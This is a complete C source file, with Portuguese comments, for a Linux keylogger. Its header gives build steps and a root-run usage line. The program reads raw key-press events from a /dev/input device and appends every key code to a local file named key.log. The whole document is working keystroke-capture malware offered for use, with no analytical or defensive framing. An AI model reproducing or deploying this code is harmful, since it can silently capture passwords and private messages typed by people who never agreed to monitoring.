/* Autor Clesio Maxuel clesiorki2014@gmail.com
Este código monitora os eventos de teclado em sistemas linux
grava os códigos hexadecimais em key.log no diretorio atual
para ler as teclas gravadas use readlog.c, este utilitario
recebe como parametro um arquivo input events do linux
exemplo:
para compilar: gcc keylogger.c -o keylogger
uso: sudo ./keylogger /dev/input/event2
referencia https://daemoniolabs.wordpress.com/tag/como-criar-keylogger-c-linux/
*/
#include <stdio.h>
#include <unistd.h>/* unistd.h para sleep() e read()*/
#include <fcntl.h>/* fcntl.h para O_RDONLY e P_NONBLOCKs*/
#include <linux/input.h>/* conten a struct input_event*/

#define NAME_LOG "key.log"/*nome do log*/
int fd, bytes, code, contador;
struct input_event data;
FILE *logFile;

int main(int argc, char *argv[]){
  if(!(logFile = fopen(NAME_LOG, "a")))
    logFile = fopen(NAME_LOG, "w");
  fd = open((char*) argv[1], O_RDONLY | O_NONBLOCK);
  contador = 0;
  while(1){
    bytes = read(fd, &data, sizeof(data));
    if(bytes > 0 && data.type == 0x01 && data.value == 1){
      fwrite(&data.code, sizeof(data.code), 1, logFile);
      if(contador == 10){
        fclose(logFile);
        logFile = fopen(NAME_LOG, "a");
        contador = 0;
      }
      contador++;
    }
  }
  return 0;
}